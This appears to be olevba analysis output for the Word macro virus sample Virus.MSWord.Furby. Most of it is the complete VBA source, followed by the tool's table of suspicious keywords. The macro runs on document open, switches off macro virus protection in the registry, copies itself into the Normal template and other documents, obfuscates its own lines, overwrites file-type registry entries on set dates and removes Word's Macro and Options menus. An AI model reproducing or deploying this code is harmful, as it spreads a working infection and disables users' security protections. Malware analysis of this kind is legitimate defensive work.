olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Furby-9b12ce64ab0695835fb7a0eeced4560850d9e698
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Furby-9b12ce64ab0695835fb7a0eeced4560850d9e698 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error GoTo furby
Options.VirusProtection = Chr(48): Options.SaveNormalPrompt = Chr(48): Options.ConfirmConversions = Chr(48): x = 0: o = 0
rt = ActiveDocument.VBProject.VBComponents.Item(Abs(1)).codemodule.countoflines

st = NormalTemplate.VBProject.VBComponents.Item(Abs(1)).codemodule.countoflines
If st > 0 And rt > 0 Then GoTo furby
If st = 0 Then
    Set rl = NormalTemplate.VBProject.VBComponents

    Set hst = ActiveDocument.VBProject.VBComponents
    If Month(Now()) = 1 And Day(Now()) = 13 Then System.PrivateProfileString("", "HKEY_CLASSES_ROOT\Word.Document.8", "") = "It's Furby!"
    If Month(Now()) = 2 And Day(Now()) = 13 Then System.PrivateProfileString("", "HKEY_CLASSES_ROOT\Word.Addin.8", "") = "Microsoft Furby Addin"
    If Month(Now()) = 3 And Day(Now()) = 13 Then System.PrivateProfileString("", "HKEY_CLASSES_ROOT\Word.Document.8", "") = "Word Furby Document"

    If Month(Now()) = 4 And Day(Now()) = 13 Then System.PrivateProfileString("", "HKEY_CLASSES_ROOT\Word.Application.8", "") = "Microsoft Furby Application"
    If Month(Now()) = 5 And Day(Now()) = 13 Then System.PrivateProfileString("", "HKEY_CLASSES_ROOT\Word.Template.8", "") = "Microsoft Furby Template"
    If Month(Now()) = 6 And Day(Now()) = 13 Then System.PrivateProfileString("", "HKEY_CLASSES_ROOT\PowerPoint.Template.8", "") = "PowerPoint Furby Template"
    If Month(Now()) = 7 And Day(Now()) = 13 Then System.PrivateProfileString("", "HKEY_CLASSES_ROOT\Word.RTF.8", "") = "Rich Furby Format"

    If Month(Now()) = 8 And Day(Now()) = 13 Then System.PrivateProfileString("", "HKEY_CLASSES_ROOT\Word.Wizard.8", "") = "Microsoft Furby Wizard"
    If Month(Now()) = 9 And Day(Now()) = 13 Then System.PrivateProfileString("", "HKEY_CLASSES_ROOT\Word.Picture.8", "") = "Microsoft Furby Picture"
    If Month(Now()) = 10 And Day(Now()) = 13 Then System.PrivateProfileString("", "HKEY_CLASSES_ROOT\PowerPoint.Show.8", "") = "Microsoft Furby Presentation"
    If Month(Now()) = 11 And Day(Now()) = 13 Then System.PrivateProfileString("", "HKEY_CLASSES_ROOT\ExcelWorksheet", "") = "Microsoft Furby Worksheet"

    If Month(Now()) = 12 And Day(Now()) = 13 Then System.PrivateProfileString("", "HKEY_CLASSES_ROOT\PowerPoint.Slide.8", "") = "Microsoft Furby Slide"
    hst.Item(Abs(1)).Name = rl.Item(Abs(1)).Name
    hst.Item(Abs(1)).Export Application.StartupPath & System.OperatingSystem
End If

If rt = 0 Then Set rl = ActiveDocument.VBProject.VBComponents
rl.Item(Abs(1)).codemodule.AddFromFile Application.StartupPath & System.OperatingSystem
With rl.Item(Abs(1)).codemodule
    For j = Chr(49) To Chr(52)

    .deletelines Chr(49)
        Next j
End With
With rl.Item(Abs(1)).codemodule

 For j = Chr(53) To rl.Item(Abs(1)).codemodule.countoflines Step Chr(53)
    x = Int(Rnd(412835) * 303989) + 8485
    o = Int(Rnd(487958) * 785865) + 2988
    .replaceline j, Chr(39) & x * o & o * x & x * o

    Next j
 End With
System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\Word\Options", "EnableMacroVirusProtection") = "0"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options", "EnableMacroVirusProtection") = "0"

If st = 0 Then CommandBars("tools").Controls("Macro").Delete
If st = 0 Then CommandBars("tools").Controls("Options...").Delete
If st = 0 Then rl.Item(Abs(1)).codemodule.replaceline 1, "Sub AutoClose()"
If st = 0 And rt = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName

furby:
If st <> 0 And rt = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub 'WM97/Furby by Virus :) Smile

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

